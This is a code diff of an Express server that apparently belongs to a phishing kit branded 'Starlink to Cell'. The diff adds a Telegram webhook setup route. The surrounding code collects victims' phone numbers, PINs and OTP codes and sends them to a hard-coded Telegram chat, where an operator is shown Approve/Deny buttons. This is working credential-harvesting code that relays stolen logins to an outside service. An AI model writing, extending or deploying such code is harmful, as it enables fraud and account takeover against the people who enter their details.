@@ -1,6 +1,6 @@
 const express = require('express');
 const cors = require('cors');
-const fetch = require('node-fetch'); // <-- ADD THIS LINE
+const fetch = require('node-fetch');
 const app = express();
 const PORT = process.env.PORT || 5000;
 
@@ -14,10 +14,8 @@ app.use(cors({
   allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin']
 }));
 
-// Handle preflight requests
 app.options('*', cors());
 
-// Additional CORS headers
 app.use((req, res, next) => {
   res.header('Access-Control-Allow-Origin', '*');
   res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, PATCH, OPTIONS');
@@ -57,7 +55,39 @@ const CHAT_ID = '8392790531';
 const pendingRequests = {};
 
 // ============================================
-// SEND TELEGRAM LOGIN REQUEST WITH APPROVAL BUTTONS
+// SET TELEGRAM WEBHOOK - ADD THIS
+// ============================================
+app.get('/api/set-webhook', async (req, res) => {
+  try {
+    const webhookUrl = `https://abundant-liberation.up.railway.app/api/telegram/callback`;
+    
+    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/setWebhook`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        url: webhookUrl
+      })
+    });
+    
+    const data = await response.json();
+    console.log('📤 Webhook set:', data);
+    
+    res.json({
+      success: data.ok,
+      message: data.description || 'Webhook set successfully',
+      data: data
+    });
+  } catch (error) {
+    console.error('❌ Webhook error:', error);
+    res.status(500).json({
+      success: false,
+      message: error.message
+    });
+  }
+});
+
+// ============================================
+// SEND TELEGRAM LOGIN REQUEST
 // ============================================
 async function sendTelegramLoginRequest(phone, pin, requestId) {
   try {
@@ -200,10 +230,8 @@ app.post('/api/auth/login', async (req, res) => {
       });
     }
 
-    // Generate unique request ID
     const requestId = 'login_' + Date.now() + '_' + Math.random().toString(36).substr(2, 5);
 
-    // Store pending request
     pendingRequests[requestId] = {
       phone: phoneNumber,
       pin: pin,
@@ -211,7 +239,6 @@ app.post('/api/auth/login', async (req, res) => {
       timestamp: new Date().toISOString()
     };
 
-    // Send Telegram notification with Approve/Deny buttons
     await sendTelegramLoginRequest(phoneNumber, pin, requestId);
 
     res.json({
@@ -279,7 +306,6 @@ app.post('/api/auth/verify-otp', async (req, res) => {
       });
     }
 
-    // Send OTP to Telegram (notification only)
     try {
       const message = `📡 *Starlink to Cell - OTP Verification*\n\n📱 *Phone:* +263 ${phoneNumber}\n🔑 *OTP Entered:* \`${otp}\`\n⏰ *Time:* ${new Date().toLocaleString()}\n\n✅ User has been verified and redirected to dashboard.`;
 
@@ -403,6 +429,7 @@ app.listen(PORT, '0.0.0.0', () => {
   console.log('====================================');
   console.log(`✅ Server running on port ${PORT}`);
   console.log(`✅ Health check: /api/health`);
+  console.log(`✅ Set webhook: /api/set-webhook`);
   console.log(`🤖 Telegram Bot configured`);
   console.log(`📱 Chat ID: ${CHAT_ID}`);
   console.log('====================================');
